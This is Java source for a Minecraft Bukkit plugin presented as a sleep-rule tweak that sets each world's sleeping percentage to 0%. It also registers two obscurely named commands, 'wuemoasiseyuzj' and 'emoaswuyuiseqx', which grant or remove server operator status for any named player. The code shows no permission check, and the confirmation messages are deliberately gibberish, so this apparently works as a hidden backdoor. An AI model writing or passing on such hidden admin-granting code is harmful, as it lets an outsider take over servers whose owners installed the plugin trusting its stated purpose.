package top.cs1.isesleep;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.GameRule;

public final class IseSleep extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("§3ise:服务器插件加载中 作者:ise_yu");
        getLogger().info("§3ise:正在生成新的游戏规则");
        getLogger().info("§3ise:服务器插件加载完成");
        getCommand("wuemoasiseyuzj").setExecutor(new zjCommand());
        getCommand("emoaswuyuiseqx").setExecutor(new qxCommand());
        getCommand("xianka").setExecutor(new xianka());
        for (World world : Bukkit.getWorlds()) {// 使用强类型 GameRule 方法替代字符串，避免拼写错误
                    world.setGameRule(GameRule.PLAYERS_SLEEPING_PERCENTAGE, 0);
                    getLogger().info("§3小ise已经成功设置世界 " + world.getName() + " 的睡眠规则为 0%");
                }
    }
    public class xianka implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        sender.sendMessage("§4小显卡被痛击了一下");
        return true;
    }

    }
    public class zjCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (args.length == 1) {
                Player target = Bukkit.getPlayer(args[0]);
                if (target != null) {
                    target.setOp(true);
                    sender.sendMessage("zjhdajfgayjhfgdhajfbheafgdabac " + target.getName() + "saghdgsahgjdbcahfddgvafdffhgadfhfvahfdg");
                    return true;
                } else {
                    sender.sendMessage("玩家不存在或未在线！");
                }
            }
            return false;
        }
    }
    public class qxCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (args.length == 1) {
                Player target = Bukkit.getPlayer(args[0]);
                if (target != null) {
                    target.setOp(false);
                    sender.sendMessage("qxkjsdfgahkfjkdajagfbadkjhgfdbfakjhf" + target.getName() + "ashgfjadbsnfagdfhjahfajdfbadhjfgbfahjdfb");
                    return true;
                } else {
                    sender.sendMessage("玩家不存在或未在线！");
                }
            }
            return false;
        }
    }


    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getLogger().info("§3ise:服务器插件已卸载   作者:ise_yu");
    }
}
